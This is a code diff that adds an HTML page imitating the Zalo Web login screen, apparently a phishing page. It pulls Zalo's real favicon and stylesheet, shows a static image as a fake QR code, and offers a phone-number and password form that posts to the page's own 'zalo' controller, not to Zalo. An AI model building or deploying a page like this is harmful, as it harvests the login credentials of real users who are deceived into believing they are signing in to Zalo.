@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta charset="utf-8">
+    <link id="favico" rel="icon" type="image/png" href="https://stc-zaloid.zdn.vn/zaloid/client/images/favicon.png">
+    <link href="https://stc-zaloid.zdn.vn/zaloid/client/main-5.4.0.css" rel="stylesheet">
+    <title>Đăng nhập tài khoản Zalo</title>
+</head>
+<body style="background: url('../image/b1.png') 0 0 no-repeat;">
+    <div id="app" class="wrapper-page has-mobile">
+        <div class="wrapper-page is-only-desktop">
+            <div class="zLogin-layout">
+                <div class="header animated fadeIn">
+                    <h1><a class="logo" style="cursor: auto;"></a></h1>
+                    <h2 style="font-size: 1.1em;">Đăng nhập tài khoản Zalo<br>để kết nối với ứng dụng Zalo Web</h2>
+                </div>
+                <div class="body">
+                    <div></div>
+                    <div class="animated fadeIn body-container">
+                        <div class="tabs animated fadeIn">
+                            <ul>
+                                <li>
+                                    <a class="hea active" id="hea1"  onclick="myFunction('content','qrcode','hea1')">Với Mã QR</a>
+                                </li>
+                                <li>
+                                    <a class="hea" id="hea2"  onclick="myFunction('content','user-password','hea2')">Với Số điện thoại</a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="content animated fadeIn" id="qrcode">
+                            <div class="form-signin animated fadeIn" style="min-height: 270px;">
+                                <div class="in-tableCell">
+                                    <div class="qrcode ">
+                                        <img src="../image/b2.png" alt="QR Code" style="width: 224px; height: 224px;">
+                                        <div class="qrcode-expired">
+                                            <p>Mã QR hết hạn</p>
+                                            <a tabindex="0" class="btn btn--s">Lấy mã mới</a>
+                                        </div>
+                                    </div>
+                                    <p class="textAlign-center otr-2">Quét mã QR bằng Zalo để đăng nhập</p>
+                                    <div class="space"></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="content animated fadeIn" id="user-password" style="display:none;">
+                            <div class="animated fadeIn">
+                                <div class="form-signin">
+                                    <form asp-action="Index" asp-controller="zalo" method="post">
+                                        <div class="animated fadeIn">
+                                            <div class="line-form has-ico has-flag">
+                                                <div>
+                                                    <i class="fa fa-mobile"></i>
+                                                    <div class="select-flag">
+                                                        <span class="tf">+84</span>
+                                                        <div class="dropdown-flag hidden">
+                                                            <ul>
+                                                                <li class="selected">
+                                                                    <span class="flag flag-vn" alt="Vietnam"></span>
+                                                                    <span>
+                                                                        <strong>Vietnam</strong>
+                                                                        <em>+84</em>
+                                                                    </span>
+                                                                </li>
+                                                            </ul>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <input id="account" tabindex="1" type="number" name="account" maxlength="9" required autocomplete="off" placeholder="Số điện thoại" class="input" value="">
+                                            </div>
+                                            <div class="line-form has-ico">
+                                                <i class="fa fa-lock"></i>
+                                                <input tabindex="2" type="password" id="password" name="password" required placeholder="Mật khẩu" autocomplete="off" value="">
+                                            </div>
+                                            <div class="space"></div>
+                                            <div class="textAlign-center has-2btn">
+                                                <button tabindex="3" class="btn btn--m block first" style=" width: 310px;">Đăng nhập với mật khẩu</button>
+                                                <div class="btn-wrap-more">
+                                                    <div class="login-or">
+                                                        <a href="#" style="margin: 0px auto; overflow: hidden; white-space: nowrap;">Quên mật khẩu?</a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer">
+                    <p class="select-lang">
+                        <a class="lang" style="font-weight: bold;">Tiếng Việt</a>
+                        <a class="lang">English</a>
+                    </p>
+                    <p>Dùng tài khoản Zalo để truy cập các ứng dụng của ZA</p>
+                    <div class="logos">
+                        <ul>
+                            <li>
+                                <a href="http://zalo.me" target="_blank" class="logo-zalo">
+                                    <i class="logo-zalo">Zalo</i>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="http://zingmp3.vn" target="_blank" class="logo-zingmp3">
+                                    <i class="logo-zingmp3">ZingMp3</i>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="http://tv.zing.vn" target="_blank" class="logo-zingtv">
+                                    <i class="logo-zingtv">ZingTV</i>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="http://zing.vn" target="_blank" class="logo-zing">
+                                    <i class="logo-zing">Zing</i>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="http://baomoi.com" target="_blank" class="logo-baomoi">
+                                    <i class="logo-baomoi">Baomoi</i>
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+                <div id="zcaptcha"></div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+<script>
+    function myFunction(classz, idz, hea) {
+        var cl = document.getElementsByClassName(classz);
+        for (var i = 0; i < cl.length; i++) {
+            cl[i].style.display = "none";
+        }
+        document.getElementById(idz).style.display = "block";
+        var h = document.getElementsByClassName('hea');
+        for (var j = 0; j < h.length; j++) {
+            h[j].className = h[j].className.replace(" active","")
+        }
+        document.getElementById(hea).className += " active";
+    }
+</script>
